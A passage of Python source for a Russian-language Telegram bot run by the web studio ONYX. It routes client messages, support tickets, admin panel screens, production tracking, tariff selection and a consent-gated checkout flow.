    if st and st.get("flow") == "cap":
        cap_text_input(chat_id, user, st, text, contact); return
    if st and st.get("flow") == "bc_text":
        if not is_admin(uid):
            state_del(uid); return
        bc_preview(chat_id, uid, st.get("topic"), text); return
    if st and st.get("flow") == "partner":
        key = PARTNER_STEPS[st["i"]][0]
        if key == "has_clients":
            send(chat_id, "Пожалуйста, выберите вариант кнопкой выше 👆"); return
        partner_step_next(chat_id, user, st, text); return
    # --- Правки клиента одним сообщением (ТЗ п.9 → промпт №6) ---
    if st and st.get("flow") == "client_changes":
        state_del(uid)
        _set(f"onyx:changes:{uid}", text, ttl=YEAR)
        o = active_order(uid)
        if o:
            apply_project_status(o["id"], "revision", notify=False)
        try:
            create_task("order", (o or {}).get("id", uid), f"Внести правки клиента (id {uid})",
                        description=text[:500], telegram_id=uid,
                        order_id=(o or {}).get("id", ""), priority="high", notify=False)
            journal_add(client_id_of(uid), "client_changes_received", extra=text[:120])
        except Exception as e:
            print("changes task err", e)
        uname = f"@{user.get('username')}" if user.get("username") else "-"
        notify_admins(f"✏️ <b>Правки от клиента</b>\n{uname} (id {uid})\n\n{text[:800]}\n\n"
                      f"Пересобрать промпт №6: /prompts {uid} regen")
        send(chat_id, "✅ Правки приняты! Внесём их одним пакетом и вернёмся с обновлённой версией.",
             MAIN_MENU)
        return
    # --- Этап 16: обращение в поддержку (описание проблемы) ---
    if st and st.get("flow") == "ticket_msg":
        state_del(uid)
        t = ticket_create(uid, user.get("username", ""), st.get("category", "other"), text)
        send(chat_id, f"✅ Обращение #{t['ticket_id']} создано. Команда ONYX ответит вам здесь, в боте. 🤝", MAIN_MENU)
        return
    # --- Этап 14: админ пишет клиенту по проекту / вводит URL ---
    if st and st.get("flow") == "prod_msg" and is_admin(uid):
        oid = st.get("order_id"); state_del(uid)
        pr = prod_get(oid)
        if pr:
            ok = safe_send(pr["telegram_id"], f"💬 <b>Сообщение от команды ONYX по вашему проекту №{oid}:</b>\n\n{text}", MAIN_MENU)
            send(chat_id, "Отправлено ✅" if ok else "Не удалось отправить (клиент мог заблокировать бота).")
        return
    if st and st.get("flow") == "prod_set" and is_admin(uid):
        field = st.get("field"); oid = st.get("order_id"); state_del(uid)
        pr = prod_get(oid)
        if pr:
            if field == "github":
                pr["github_repo_url"] = text; pr["github_status"] = "code_uploaded"
            elif field == "vercel":
                pr["vercel_preview_url"] = text; pr["vercel_status"] = "preview_ready"
            elif field == "domain":
                pr["domain_name"] = text; pr["domain_status"] = "connected"
            elif field == "site":
                pr["production_url"] = text
            prod_save(pr)
            send(chat_id, f"Сохранено: {field} = {text} ✅")
        return
    if st and st.get("flow") == "rev_admin_edit" and is_admin(uid):
        rid = st.get("rid"); state_del(uid)
        r = review_get(rid)
        if not r:
            send(chat_id, "Отзыв не найден."); return
        r["text_review"] = text
        review_save(r)
        send(chat_id, f"✅ Текст отзыва review_id {rid} обновлён.")
        notify_review_admins(r)
        return
    # --- Этап 16: админ отвечает по тикету: /reply <id> <текст> ---
    if is_admin(uid) and text.startswith("/reply"):
        parts = text.split(maxsplit=2)
        if len(parts) < 3:
            send(chat_id, "Формат: /reply &lt;id_обращения&gt; &lt;текст&gt;"); return
        try:
            t = ticket_get(int(parts[1]))
        except Exception:
            t = None
        if not t:
            send(chat_id, "Обращение не найдено."); return
        t["last_answer"] = parts[2]; t["status"] = "answered"; ticket_save(t)
        ok = safe_send(t["telegram_id"], f"💬 <b>Ответ поддержки ONYX (обращение #{t['ticket_id']}):</b>\n\n{parts[2]}", MAIN_MENU)
        send(chat_id, "Ответ отправлен ✅" if ok else "Не удалось отправить клиенту."); return

    # Меню
    if text == "🔍 Бесплатный аудит":
        state_set(uid, {"flow": "audit_url"})
        send(chat_id, AUDIT_INTRO, {"keyboard": [[{"text": "🏠 Главное меню"}]], "resize_keyboard": True})
        return
    if text == "🖼 Примеры сайтов":
        log_event(uid, "gallery_open")
        lead_touch(uid, username=user.get("username"), action="gallery_open")
        send_rich(chat_id, gallery_md(), reply_markup=gallery_kb()); return
    if text == "🛒 Тарифы и услуги":
        log_event(uid, "tariffs_open")
        lead_touch(uid, username=user.get("username"), action="tariffs_open", inc_tariffs=True)
        recompute_tags(uid)
        send_tariff_album(chat_id, uid); return
    if text == "📦 Мой заказ":
        log_event(uid, "myorder_open")
        txt, kb = render_my_order(uid)
        send(chat_id, txt, kb); return
    if text == "👤 Личный кабинет":
        log_event(uid, "cabinet_open")
        send(chat_id, "👤 <b>Личный кабинет</b>\nВыберите раздел:", CABINET_KB); return
    if text == "🤝 Стать партнёром":
        open_partner_section(chat_id, uid); return
    if text == "⭐ Отзывы ONYX":
        log_event(uid, "reviews_open")
        send_reviews_section(chat_id, uid); return
    if text == "📄 Документы":
        log_event(uid, "docs_open")
        send_rich(chat_id, DOCS_TEXT, None, docs_kb()); return
    if text == "🆘 Поддержка":
        send(chat_id, SUPPORT_TEXT, support_kb()); return

    # старые кнопки (обратная совместимость со старыми чатами, в меню не показываются)
    if text in ("🌐 Получить сайт", "/brief"):
        send_rich(chat_id, GREETING_TEXT + "\n\n**Что вам сейчас нужно?**",
                  None, goal_picker_kb()); return
    if text in ("⭐ Оценить сервис", "/review"):
        open_review_section(chat_id, uid, user.get("username", "")); return
    # «📋 Что подготовить», «💬 Вопрос менеджеру», «Разработчику» - удалены,
    # их заменили «🆘 Поддержка» и чек-лист в /start.

    main_menu(chat_id, "Выберите действие в меню ниже 👇")


# ------------------------- Обработка кнопок -------------------------
def process_callback(cq):
    data = cq.get("data", "")
    user = cq["from"]; uid = user["id"]
    msg = cq.get("message", {})
    chat_id = msg.get("chat", {}).get("id")
    mid = msg.get("message_id")
    answer_cb(cq["id"])

    # Нажатия ограничиваем молча: показывать предупреждение на каждый клик
    # раздражает, а защита от автокликера нужна.
    if not rate_ok(uid, "cb"):
        return

    # Запоминаем экран до его отрисовки - чтобы кнопка «Назад» знала,
    # откуда человек пришёл.
    nav_push(uid, data)

    if data == "b:home":
        state_del(uid); nav_clear(uid); main_menu(chat_id); return

    # Настоящий шаг назад: открываем предыдущий экран тем же обработчиком,
    # что и обычное нажатие. Новые экраны поддерживаются сами собой.
    if data == "b:back":
        prev = nav_pop(uid)
        if not prev:
            state_del(uid); main_menu(chat_id); return
        process_callback({"id": cq.get("id"), "data": prev, "from": user,
                          "message": msg})
        return

    if data == "gallery:open":
        answer_cb(cq["id"])
        edit_rich(chat_id, mid, gallery_md(), None, gallery_kb()); return
    if data.startswith("gal:d:"):
        key = data.split(":", 2)[2]
        if key not in DEMOS:
            return
        answer_cb(cq["id"])
        log_event(uid, "demo_card_open", key)
        edit_rich(chat_id, mid, demo_card_md(key), None, demo_card_kb(key)); return

    # --- Этап 11: админ-панель ---
    if data.startswith("adm:"):
        if not is_admin(uid):
            answer_cb(cq["id"], "Недоступно"); return
        sub = data[4:]
        if sub == "home":
            open_admin_panel(chat_id, mid); return
        if sub == "stats":
            edit_or_send(chat_id, mid, admin_stats_text(), admin_stats_kb()); return
        if sub == "funnel":
            edit_or_send(chat_id, mid, funnel_text(),
                         {"inline_keyboard": [[{"text": "🔄 Обновить", "callback_data": "adm:funnel"}],
                                              [{"text": "⬅️ Назад", "callback_data": "adm:home"}]]}); return
        if sub == "clients":
            edit_or_send(chat_id, mid, "👥 <b>Клиенты по тегам</b>\nВыберите сегмент:", admin_tags_kb()); return
        if sub == "followup":
            edit_or_send(chat_id, mid, admin_followup_text(),
                         {"inline_keyboard": [[{"text": "🔄 Обновить", "callback_data": "adm:followup"}],
                                              [{"text": "⬅️ Назад", "callback_data": "adm:stats"}]]}); return
        if sub.startswith("tag:"):
            tag = sub[4:]
            edit_or_send(chat_id, mid, admin_tag_list_text(tag),
                         {"inline_keyboard": [[{"text": "⬅️ Назад", "callback_data": "adm:clients"}]]}); return
        if sub == "orders":
            edit_or_send(chat_id, mid, admin_orders_list(),
                         {"inline_keyboard": [[{"text": "⬅️ Назад", "callback_data": "adm:home"}]]}); return
        if sub == "tasks":
            txt, kb = admin_tasks_text("open")
            edit_or_send(chat_id, mid, txt, kb or {"inline_keyboard": [
                [{"text": "🔥 Срочные", "callback_data": "adm:tasks_urgent"}],
                [{"text": "⬅️ Назад", "callback_data": "adm:home"}]]}); return
        if sub == "tasks_urgent":
            txt, kb = admin_tasks_text("urgent")
            edit_or_send(chat_id, mid, txt, kb or {"inline_keyboard": [[{"text": "⬅️ Назад", "callback_data": "adm:tasks"}]]}); return
        if sub == "prod":
            txt, kb = admin_prod_text()
            edit_or_send(chat_id, mid, txt, kb); return
        if sub == "domains":
            rows = []
            for luid in all_lead_ids():
                d = domain_get(luid)
                if d:
                    rows.append(f"• id {luid} · {d.get('domain_name') or '-'} · {d.get('domain_status')}")
            edit_or_send(chat_id, mid, "🌐 <b>Домены</b>\n\n" + ("\n".join(rows[:25]) if rows else "Пока нет доменных записей."),
                         {"inline_keyboard": [[{"text": "⬅️ Назад", "callback_data": "adm:home"}]]}); return
        if sub == "partners":
            lines = ["🤝 <b>Партнёры</b>"]
            for puid in (partners_all() or [])[-20:]:
                pp = partner_get(puid)
                if pp:
                    lines.append(f"{pp['partner_code']} · id {puid} · {pp.get('name', '-')} · "
                                 f"{PARTNER_STATUS_RU.get(pp.get('partner_status'), '')}")
            edit_or_send(chat_id, mid, "\n".join(lines) if len(lines) > 1 else "Заявок партнёров пока нет.",
                         {"inline_keyboard": [[{"text": "⬅️ Назад", "callback_data": "adm:home"}]]}); return
        if sub == "errors":
            errs = _get("onyx:errors_recent") or []
            edit_or_send(chat_id, mid, "🐞 <b>Последние ошибки</b>\n\n" + ("\n".join(f"• {e}" for e in errs[-15:]) if errs else "Ошибок не зафиксировано 👍"),
                         {"inline_keyboard": [[{"text": "⬅️ Назад", "callback_data": "adm:home"}]]}); return
        # разделы, использующие существующие команды
        hint = {"payments": "💳 <b>Оплаты / счета</b>\n\nОплата у клиентов - по счёту. Команды: /invoices (ждут счёта), /paid № (отметить оплаченным), /orders.",
                "audits": "🔍 <b>Аудиты</b>\n\nАудиты приходят админам уведомлениями. Коммерческие предложения - в листе AuditOffers.",
                "broadcasts": "📣 <b>Рассылки</b>\n\nКоманды: /post (по темам), /broadcasts (история), /broadcast текст (всем)."}
        edit_or_send(chat_id, mid, hint.get(sub, sub),
                     {"inline_keyboard": [[{"text": "⬅️ Назад", "callback_data": "adm:home"}]]}); return

    # --- задачи: детали / смена статуса ---
    if data.startswith("task:"):
        if not is_admin(uid):
            answer_cb(cq["id"], "Недоступно"); return
        parts = data.split(":")
        if parts[1] == "v":
            t = task_get(int(parts[2]))
            if not t:
                answer_cb(cq["id"], "Не найдено"); return
            txt, kb = admin_task_detail(t)
            edit_or_send(chat_id, mid, txt, kb); return
        if parts[1] == "s":
            t = task_get(int(parts[2]))
            if not t:
                return
            new_status = parts[3]
            if new_status in ("done", "cancelled"):
                task_close(t, new_status)
            else:
                t["task_status"] = new_status; task_save(t)
            answer_cb(cq["id"], TASK_STATUS_RU.get(new_status, new_status))
            txt, kb = admin_task_detail(t)
            edit_or_send(chat_id, mid, txt, kb); return
        return

    # --- производство: детали / статусы / ввод URL ---
    if data.startswith("prod:"):
        if not is_admin(uid):
            answer_cb(cq["id"], "Недоступно"); return
        parts = data.split(":")
        act = parts[1]
        if act == "v":
            pr = prod_get(int(parts[2]))
            if not pr:
                answer_cb(cq["id"], "Не найдено"); return
            txt, kb = admin_prod_detail(pr)
            edit_or_send(chat_id, mid, txt, kb); return
        if act == "stage":
            pr = prod_get(int(parts[2]))
            if not pr:
                return
            cur = pr.get("stage", "new")
            i = PROD_STAGES.index(cur) if cur in PROD_STAGES else 0
            pr["stage"] = PROD_STAGES[min(i + 1, len(PROD_STAGES) - 1)]
            prod_save(pr)
            answer_cb(cq["id"], f"Этап: {pr['stage']}")
            txt, kb = admin_prod_detail(pr)
            edit_or_send(chat_id, mid, txt, kb); return
        if act == "materials":
            pr = prod_get(int(parts[2]))
            if pr:
                pr["materials_status"] = "requested"; prod_save(pr)
                safe_send(pr["telegram_id"],
                          md_to_html("# 📤 Нужны материалы для сайта\n\n"
                                     "Пришлите, что есть: логотип, фото работ или помещения, "
                                     "отзывы, сертификаты.\n\n" + DRIVE_INFO),
                          {"inline_keyboard": [
                              [{"text": "📎 Загрузить материалы", "callback_data": "up:open"}]]})
                answer_cb(cq["id"], "Запрос материалов отправлен клиенту")
            return
        if act == "approve":
            pr = prod_get(int(parts[2]))
            if pr:
                pr["client_approval_status"] = "sent"; prod_save(pr)
                url = pr.get("vercel_preview_url") or pr.get("production_url") or ""
                safe_send(pr["telegram_id"], "👀 <b>Ваш сайт готов к проверке!</b>\n"
                          + (f"Посмотрите: {url}\n\n" if url else "") +
                          "Напишите в поддержку, если нужны правки, или подтвердите - и мы опубликуем финальную версию.", MAIN_MENU)
                answer_cb(cq["id"], "Отправлено клиенту на проверку")
            return
        if act == "finish":
            pr = prod_get(int(parts[2]))
            if pr:
                pr["stage"] = "delivered"; pr["final_check_status"] = "done"
                pr["client_approval_status"] = "approved"; prod_save(pr)
                o = order_get(pr["order_id"])
                if o:
                    apply_project_status(o["id"], "completed")
                answer_cb(cq["id"], "Проект завершён")
                txt, kb = admin_prod_detail(pr)
                edit_or_send(chat_id, mid, txt, kb)
            return
        if act == "msg":
            state_set(uid, {"flow": "prod_msg", "order_id": int(parts[2])})
            send(chat_id, "✍️ Напишите сообщение клиенту одним сообщением:",
                 {"keyboard": [[{"text": "🏠 Главное меню"}]], "resize_keyboard": True}); return
        if act == "set":
            field, oid = parts[2], int(parts[3])
            state_set(uid, {"flow": "prod_set", "field": field, "order_id": oid})
            send(chat_id, f"✍️ Пришлите значение для «{field}» (URL/домен):",
                 {"keyboard": [[{"text": "🏠 Главное меню"}]], "resize_keyboard": True}); return
        return

    # --- Этап 16: поддержка / тикеты / FAQ ---
    if data == "sup:back":
        edit_or_send(chat_id, mid, SUPPORT_TEXT, support_kb()); return
    if data == "sup:faq":
        edit_or_send(chat_id, mid, "❓ <b>Помощь / FAQ ONYX</b>\nВыберите вопрос:", faq_menu_kb()); return
    if data.startswith("faq:"):
        try:
            q, ans = FAQ[int(data.split(":")[1])]
        except Exception:
            return
        edit_or_send(chat_id, mid, f"<b>{q}</b>\n\n{ans}",
                     {"inline_keyboard": [[{"text": "⬅️ К вопросам", "callback_data": "sup:faq"}],
                                          [{"text": "💬 Связаться с поддержкой", "callback_data": "sup:new"}]]}); return
    # ─────────── Вход: три ветки ───────────
    if data == "entry:back":
        answer_cb(cq["id"])
        edit_rich(chat_id, mid, ENTRY_MD, reply_markup=entry_kb()); return
    if data == "entry:site":
        answer_cb(cq["id"])
        crm_set(uid, "audit_requested", notify=False)
        log_event(uid, "entry_site")
        state_set(uid, {"flow": "audit_url"})
        edit_rich(chat_id, mid, AUDIT_INTRO_MD,
                  reply_markup={"inline_keyboard": [help_row("entry:back")]}); return
    if data == "entry:nosite":
        answer_cb(cq["id"])
        crm_set(uid, "material_sent", notify=False)
        log_event(uid, "entry_nosite")
        checklist_delivered(uid)
        edit_rich(chat_id, mid, NOSITE_MD, reply_markup=nosite_kb())
        schedule_followup(uid, "consult_invite", user.get("username", "")); return
    if data == "entry:manager":
        answer_cb(cq["id"])
        log_event(uid, "entry_manager")
        edit_rich(chat_id, mid, MANAGER_MD, reply_markup=manager_kb(uid)); return

    # ─────────── Конвертер: стратегическая консультация ───────────
    if data == "cons:offer":
        answer_cb(cq["id"])
        crm_set(uid, "consult_offered", notify=False)
        log_event(uid, "consult_offered")
        state_set(uid, {"flow": "cons"})
        edit_rich(chat_id, mid, CONSULT_MD, reply_markup=consult_way_kb()); return
    if data == "cons:way:tg":
        answer_cb(cq["id"])
        _st = state_get(uid) or {}
        _st.update({"flow": "cons", "way": "tg"}); state_set(uid, _st)
        edit_rich(chat_id, mid,
                  "# 🎯 Когда вам удобно?\n\nНапишем здесь, в Telegram, в выбранное время.",
                  reply_markup=cons_when_kb()); return
    if data == "cons:way:call":
        answer_cb(cq["id"])
        state_set(uid, {"flow": "cons", "way": "call", "stage": "phone"})
        edit_rich(chat_id, mid,
                  "# 📞 На какой номер позвонить?\n\nОтправьте номер сообщением - "
                  "например `+7 999 123-45-67`.\n\n"
                  "> Номер нужен только для этого звонка.",
                  reply_markup={"inline_keyboard": [help_row("cons:offer")]}); return
    if data.startswith("cons:when:"):
        answer_cb(cq["id"])
        _st = state_get(uid) or {}
        if _st.get("flow") != "cons":
            _st = {"flow": "cons", "way": "tg"}
        _st["when"] = data.split(":", 2)[2]
        cons_finish(chat_id, mid, uid, user, _st); return

    # ─────────── Оформление проекта после консультации ───────────
    if data == "proj:start":
        answer_cb(cq["id"])
        edit_rich(chat_id, mid, PROJECT_START_MD, reply_markup=project_start_kb()); return
    if data == "proj:go":
        answer_cb(cq["id"])
        crm_set(uid, "project_setup", notify=False)
        log_event(uid, "project_start")
        edit_rich(chat_id, mid, GOAL_PICK_MD, reply_markup=goal_picker_kb()); return
    if data == "model:ok":
        answer_cb(cq["id"])
        log_event(uid, "model_ok")
        start_anketa(chat_id, uid, user, mid); return

    # ─────────── Квалификация: восемь подтверждений ───────────
    if data == "pkg:recommend":
        answer_cb(cq["id"])
        crm_set(uid, "package_offered", notify=False)
        log_event(uid, "package_offered")
        _p = user_get(uid) or {}
        _d = _get(f"onyx:quest:{uid}") or {}
        if _p.get("chosen_tariff"):
            show_package_summary(chat_id, uid, mid)
        else:
            show_tariff_recommendation(chat_id, uid, _p.get("client_goal", "unsure"), _d, mid)
        return
    if data == "pkg:show":
        answer_cb(cq["id"])
        show_package_summary(chat_id, uid, mid); return
    if data == "q8:go":
        answer_cb(cq["id"])
        crm_set(uid, "qualifying", notify=False)
        log_event(uid, "qual_started")
        qual_push(chat_id, uid, 0, {}, mid); return
    if data.startswith("q8:back:"):
        answer_cb(cq["id"])
        _st = state_get(uid) or {}
        try:
            i = max(0, int(data.split(":")[2]))
        except Exception:
            return
        qual_push(chat_id, uid, i, dict(_st.get("answers", {})), _st.get("mid") or mid); return
    if data.startswith("q8:"):
        parts = data.split(":")
        try:
            i = int(parts[1])
        except Exception:
            return
        if i >= len(QUAL_POINTS):
            return
        answer_cb(cq["id"])
        _st = state_get(uid) or {}
        ans = dict(_st.get("answers", {}))
        qmid = _st.get("mid") or mid
        if parts[2] == "ask":
            # сомнение на конкретном пункте - это сигнал менеджеру, а не отказ
            escalate(uid, "Сомнение в условиях",
                     f"Пункт: {QUAL_POINTS[i][1]}")
            state_set(uid, {"flow": "ask_mgr", "back": f"q8:back:{i}"})
            edit_rich(chat_id, qmid,
                      f"# 💬 Обсудим\n\n**{QUAL_POINTS[i][1]}**\n\n"
                      "Напишите, что смущает - менеджер ответит лично. "
                      "Можно продолжить и вернуться к этому позже.",
                      reply_markup={"inline_keyboard": [
                          [{"text": "▶️ Продолжить", "callback_data": f"q8:back:{i}"}]]})
            return
        ans[QUAL_POINTS[i][0]] = "yes"
        if i + 1 < len(QUAL_POINTS):
            qual_push(chat_id, uid, i + 1, ans, qmid)
        else:
            qual_finish(chat_id, uid, user, ans, qmid)
        return

    # ─────────── Материалы ───────────
    if data == "mat:list":
        answer_cb(cq["id"])
        edit_rich(chat_id, mid, MATERIALS_MD, reply_markup=materials_kb()); return
    if data == "mat:done":
        answer_cb(cq["id"])
        crm_set(uid, "materials_received")
        log_event(uid, "materials_received")
        cancel_followups(uid, ("materials_missing",))
        edit_rich(chat_id, mid,
                  "# ✅ Приняли\n\nМенеджер проверит полноту материалов и запустит "
                  "производство. Как только сборка начнётся - сообщим.",
                  reply_markup={"inline_keyboard": [help_row(),
                                                    [{"text": "⬅️ Дослать материалы", "callback_data": "up:open"},
                                                     {"text": "🏠 В меню", "callback_data": "b:home"}]]})
        escalate(uid, "Клиент отправил материалы", "Проверить полноту и запустить производство")
        return
    if data == "mat:help":
        answer_cb(cq["id"])
        escalate(uid, "Нужна упаковка контента", "У клиента нет материалов - предложить платную упаковку")
        edit_rich(chat_id, mid,
                  "# 🎨 Соберём за вас\n\nЕсли фото, текстов и отзывов нет - мы можем "
                  "подготовить контент сами. Это отдельная услуга, менеджер назовёт "
                  f"стоимость под ваш объём.\n\n> {MANAGER_NAME} свяжется в течение 30 минут. Или напишите ему сами: {manager_md()}",
                  reply_markup={"inline_keyboard": [help_row(),
                                                    [{"text": "⬅️ К материалам", "callback_data": "up:open"},
                                                     {"text": "🏠 В меню", "callback_data": "b:home"}]]})
        return

    # ─────────── Позвать человека ───────────
    if data == "ask:mgr":
        answer_cb(cq["id"])
        state_set(uid, {"flow": "ask_mgr"})
        send(chat_id, "💬 Напишите вопрос одним сообщением - передам менеджеру.",
             {"keyboard": [[{"text": "🏠 Главное меню"}]], "resize_keyboard": True}); return
    if data == "sup:new":
        rows = [[{"text": lbl, "callback_data": f"sup:cat:{key}"}] for key, lbl in TICKET_CATS]
        rows.append([{"text": "⬅️ Назад", "callback_data": "sup:back"}])
        edit_or_send(chat_id, mid, "📨 <b>Новое обращение</b>\nПо какому вопросу?", {"inline_keyboard": rows}); return
    if data.startswith("sup:cat:"):
        cat = data.split(":", 2)[2]
        state_set(uid, {"flow": "ticket_msg", "category": cat})
        send(chat_id, f"Категория: <b>{TICKET_CAT_RU.get(cat, cat)}</b>\n\nОпишите ваш вопрос одним сообщением 👇",
             {"keyboard": [[{"text": "🏠 Главное меню"}]], "resize_keyboard": True}); return
    if data == "sup:my":
        ts = user_tickets(uid)
        if not ts:
            edit_or_send(chat_id, mid, "🗂 У вас пока нет обращений.",
                         {"inline_keyboard": [[{"text": "📨 Создать обращение", "callback_data": "sup:new"}],
                                              [{"text": "⬅️ Назад", "callback_data": "sup:back"}]]}); return
        lines = ["🗂 <b>Мои обращения</b>\n"]
        for t in ts[-10:]:
            lines.append(f"#{t['ticket_id']} · {TICKET_CAT_RU.get(t.get('category'), '')} · "
                         f"{TICKET_STATUS_RU.get(t.get('status'), '')} · {t.get('created_at', '')}")
            if t.get("last_answer"):
                lines.append(f"   ↳ Ответ: {t['last_answer']}")
        edit_or_send(chat_id, mid, "\n".join(lines),
                     {"inline_keyboard": [[{"text": "⬅️ Назад", "callback_data": "sup:back"}]]}); return

    # --- Этап 13: реакции на автодожимы ---
    if data == "fu:support":
        edit_or_send(chat_id, mid, SUPPORT_TEXT, support_kb()); return
    if data == "fu:stop":
        l = lead_get(uid)
        if l:
            l["followups_off"] = True; lead_save(l)
        cancel_followups(uid)
        answer_cb(cq["id"], "Больше не напомним")
        edit_or_send(chat_id, mid, "Хорошо, больше не будем напоминать. Если понадобимся - мы на связи 🤝"); return
    if data in ("fu:improve", "fu:audit"):
        state_set(uid, {"flow": "audit_url"})
        send(chat_id, AUDIT_INTRO, {"keyboard": [[{"text": "🏠 Главное меню"}]], "resize_keyboard": True}); return
    if data == "fu:ok":
        answer_cb(cq["id"], "Хорошо, ждём")
        edit_rich(chat_id, mid, "Отлично, тогда до связи в оговорённое время 🤝"); return
    if data == "fu:browse":
        answer_cb(cq["id"], "Хорошо!")
        edit_or_send(chat_id, mid, "Хорошо! Изучайте - а когда будете готовы, мы поможем с сайтом. 🤝"); return

    if data == "b:cab":
        edit_rich(chat_id, mid,
                  "# 👤 Личный кабинет\n\n"
                  "Здесь всё по вашему проекту в одном месте.\n\n"
                  "- **Статус заказа** - на каком этапе сборка прямо сейчас\n"
                  "- **Материалы** - фото, логотип и тексты, можно досылать в любой момент\n"
                  "- **Полезные письма** - разборы по темам, которые выберете сами; "
                  "не чаще раза в неделю, отписаться можно одной кнопкой",
                  None, CABINET_KB); return
    if data == "brief:start":
        # ТЗ «Новая логика квалификации»: приветствие → выбор цели → анкета → автоподбор → допуск.
        # Приветствие и выбор цели - одно сообщение, дальше вся воронка его переписывает.
        # TODO: когда будут голосовые от основателя - sendVideoNote/sendVoice отдельным сообщением.
        edit_rich(chat_id, mid, GREETING_TEXT + "\n\n**Что вам сейчас нужно?**",
                  None, goal_picker_kb())
        log_event(uid, "greeting_shown")
        return
    if data.startswith("goal:"):
        gid = data.split(":", 1)[1]
        if gid not in GOAL_RU:
            return
        p = user_get(uid) or {}
        p["client_goal"] = gid
        user_save(uid, p)
        log_event(uid, "goal_selected", gid)
        lead_touch(uid, username=user.get("username"), action="goal_selected")
        answer_cb(cq["id"], GOAL_RU[gid])
        # Шаг 3 (документ о нишах): выбор отрасли - от неё зависит состав анкеты
        edit_rich(chat_id, mid,
                  f"✅ Цель: **{GOAL_RU[gid].split(' ', 1)[-1]}**\n\n"
                  "## 🏢 В какой сфере вы работаете?\n\n"
                  "> Спросим только то, что важно для вашей отрасли - "
                  "чем точнее поймём бизнес, тем лучше получится сайт.",
                  None, niche_picker_kb())
        return
    if data.startswith("niche:"):
        nid = data.split(":", 1)[1]
        if nid not in NICHE_RU:
            return
        p = user_get(uid) or {}
        p["client_niche"] = nid
        if nid != "other":
            p["niche"] = NICHE_RU[nid].split(" ", 1)[-1]
        user_save(uid, p)
        log_event(uid, "niche_selected", nid)
        lead_touch(uid, username=user.get("username"), action="niche_selected")
        answer_cb(cq["id"], NICHE_RU[nid])
        # Сначала показываем готовый сайт из его ниши, только потом спрашиваем.
        show_demos(chat_id, uid, mid, nid)
        return
    if data == "demo:go":
        answer_cb(cq["id"])
        show_model_explain(chat_id, uid, mid)
        return
    if data == "brief:niche":
        answer_cb(cq["id"])
        edit_or_send(chat_id, mid, "🧩 <b>Выберите нишу</b>\nПодберём примеры и вопросы под неё:",
                     niche_kb())
        return
    if data == "qual:pkg_ok":
        answer_cb(cq["id"])
        show_package_summary(chat_id, uid, mid)
        return
    if data == "b:toniche":
        # с первого вопроса анкеты - назад к выбору ниши, ответы не теряем
        answer_cb(cq["id"])
        p = user_get(uid) or {}
        gid = p.get("client_goal", "unsure")
        edit_rich(chat_id, mid,
                  f"✅ Цель: **{GOAL_RU.get(gid, '').split(' ', 1)[-1]}**\n\n"
                  "## 🏢 В какой сфере вы работаете?\n\n"
                  "> Спросим только то, что важно для вашей отрасли.",
                  None, niche_picker_kb())
        return
    if data == "brief:resume":
        st = state_get(uid)
        if st and st.get("flow") == "brief":
            st["mid"] = None  # отправим свежее сообщение анкеты
            brief_push(chat_id, uid, st, force_send=True)
        else:
            st = {"flow": "brief", "i": 0, "data": {}, "mid": mid}
            brief_push(chat_id, uid, st)
        return
    if data == "brief:restart":
        state_del(uid)
        st = {"flow": "brief", "i": 0, "data": {}, "mid": mid}
        brief_push(chat_id, uid, st); return
    if data == "cart:open":
        edit_or_send(chat_id, mid, cart_show_text(uid), cart_show_kb(uid)); return

    # --- Этап 18: тарифы-пакеты + источники входа ---
    if data == "tariffs:list":
        answer_cb(cq["id"])
        send_tariff_album(chat_id, uid); return
    if data == "options:list":
        ensure_mandatory(uid)
        edit_or_send(chat_id, mid, services_list_text(uid), services_list_kb(uid)); return
    if data.startswith("trf:v:"):
        tid = data.split(":", 2)[2]
        if tid not in TARIFF:
            return
        answer_cb(cq["id"])
        # Карточку показываем картинкой, состав тарифа - отдельным сообщением
        # под ней: подпись к фото у Telegram ограничена 1024 символами,
        # а список «что входит» длиннее.
        if send_tariff_card(chat_id, tid):
            if mid:
                try:
                    tg("deleteMessage", chat_id=chat_id, message_id=mid)
                except Exception:
                    pass
            send(chat_id, tariff_card_text(tid, uid), tariff_card_kb(tid, uid)); return
        edit_or_send(chat_id, mid, tariff_card_text(tid, uid), tariff_card_kb(tid, uid)); return
    if data.startswith("trf:pick:"):
        tid = data.split(":", 2)[2]
        if tid not in TARIFF:
            return
        p = user_get(uid) or {}
        p["chosen_tariff"] = tid; user_save(uid, p)
        log_event(uid, "tariff_selected", tid)
        lead_touch(uid, username=user.get("username"), status="tariff_selected", action="tariff_selected", inc_tariffs=True)
        recompute_tags(uid)
        answer_cb(cq["id"], f"Тариф «{TARIFF[tid]['name']}» выбран")
        # Ручной выбор тарифа (запасной путь «Все тарифы») ведёт в ту же воронку
        # ознакомление → правила → оплата → мини-квалификация, что и автоподбор.
        if anketa_done(uid):
            show_package_summary(chat_id, uid, mid)
        else:
            edit_or_send(chat_id, mid,
                         f"✅ Тариф <b>{TARIFF[tid]['name']}</b> добавлен в вашу заявку.\n\n"
                         "Следующий шаг - короткая анкета. "
                         "Оплата - только после того, как вы утвердите готовый сайт.",
                         {"inline_keyboard": [[{"text": "📝 Заполнить анкету", "callback_data": "brief:start"}]]})
        return
    if data == "go:checklist":
        answer_cb(cq["id"])
        checklist_delivered(uid)
        start_flow(chat_id, uid); return
    if data == "go:audit":
        state_set(uid, {"flow": "audit_url"})
        send(chat_id, AUDIT_INTRO, {"keyboard": [[{"text": "🏠 Главное меню"}]], "resize_keyboard": True}); return
    if data == "checkout:go":
        if not anketa_done(uid):
            edit_or_send(chat_id, mid, "Сначала заполните анкету.",
                 {"inline_keyboard": [[{"text": "📝 Заполнить анкету", "callback_data": "brief:start"}]]}); return
        # 152-ФЗ: согласие спрашиваем ровно здесь - перед сбором реквизитов и ИНН
        if not has_consent(uid, "pdn"):
            edit_rich(chat_id, mid, CONSENT_SHORT, None, {"inline_keyboard": [
                [{"text": "📄 Прочитать документы", "callback_data": "doc:from_consent"}],
                [{"text": "✅ Принимаю - продолжить", "callback_data": "consent:ok"}],
                [{"text": "⬅️ Назад к заявке", "callback_data": "cart:checkout"}]]})
            log_event(uid, "consent_asked")
            return
        edit_rich(chat_id, mid,
                  INVOICE_EXPLAIN_MD + "\n\n**Вы физлицо или юрлицо?**", None,
                  {"inline_keyboard": [
                      [{"text": "👤 Физлицо", "callback_data": "pm:fiz"}],
                      [{"text": "🏢 Юрлицо / ИП", "callback_data": "pm:ur"}]]})
        log_event(uid, "requisites_started")
        lead_touch(uid, username=user.get("username"), action="requisites_started"); return
    if data == "consent:ok":
